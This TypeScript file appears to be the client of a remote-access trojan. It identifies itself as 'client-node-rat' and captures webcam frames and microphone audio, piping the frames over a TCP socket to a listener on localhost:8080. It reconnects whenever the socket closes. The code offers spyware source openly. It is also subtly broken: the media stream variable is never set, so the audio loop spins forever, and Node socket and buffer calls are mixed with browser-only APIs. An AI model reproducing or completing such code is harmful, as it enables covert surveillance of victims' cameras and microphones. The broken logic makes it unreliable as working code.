
import { Socket } from 'net'
import { Readable } from 'stream'
import dataUriToBuffer from 'data-uri-to-buffer'
import { EventEmitter } from 'events'

class AudioRecorder {
    private audioChunks: Blob[] = []
    private readonly recorder: MediaRecorder

    constructor(stream: MediaStream) {
        this.recorder = new MediaRecorder(stream)
        this.recorder.addEventListener("dataavailable", event => {
            this.audioChunks.push(event.data)
        })
    }

    public start() {
        this.recorder.start()
    }

    public stop() {

        interface AudioContent {
            audioBlob: Blob,
            audioUrl: string,
            play: () => void
        }

        return new Promise<AudioContent>((resolve) => {
            this.recorder.addEventListener("stop", () => {
                const audioBlob = new Blob(this.audioChunks)
                const audioUrl = URL.createObjectURL(audioBlob)
                const audio = new Audio(audioUrl)
                const play = () => {
                    audio.play()
                }

                resolve({ audioBlob, audioUrl, play })
            })

            this.recorder.stop()
        })
    }
}

const FPS = 50

const HOST = 'localhost'
const PORT = 8080

const client = new Socket()

let StreamMedia: MediaStream | undefined
navigator.getUserMedia({ video: true, audio: true }, mediaStream => {
    const video = document.getElementById('video') as HTMLVideoElement
    video.srcObject = mediaStream
}, err => console.error(err))


const getBufferVideo = function* () {
    while (true) {
        const canvas = document.getElementById('myCanvas') as HTMLCanvasElement
        const videoCanvas = document.getElementById('video') as HTMLVideoElement
        const ctx = canvas.getContext('2d')


        canvas.width = videoCanvas.videoWidth
        canvas.height = videoCanvas.videoHeight
        ctx?.drawImage(videoCanvas, 0, 0)
        const data_uri = canvas.toDataURL()
        const buf = dataUriToBuffer(data_uri)
        yield buf
    }
}

const getBufferAudio = async function* (time: number = 10000) {
    while (true) {
        if (typeof StreamMedia === 'undefined') continue
        const recorder = new AudioRecorder(StreamMedia)
        recorder.start()
        await new Promise(resolve => setTimeout(resolve, time))
        const contentAd = await recorder.stop()
        const arrBuf = await contentAd.audioBlob.arrayBuffer()
        const buf = Buffer.from(arrBuf)
        yield buf
    }
}

const ConnectionTCP = new EventEmitter()

ConnectionTCP.on('start', () => {
    setTimeout(() => {
        client.connect(PORT, HOST, () => {
            client.write('client-node-rat')
            const stream = Readable.from(getBufferVideo().next().value)
            stream.pipe(client)
        })
    }, 1000 / FPS)
})

ConnectionTCP.emit('start')

client.on('error', error => {
    if (error) console.error(error)
})

client.on('lookup', (error, addr, fam) => {
    if (error) console.error(error)
})

client.on('timeout', () => {
    console.log('timeout')
})

client.on('close', () => {
    ConnectionTCP.emit('start')
})


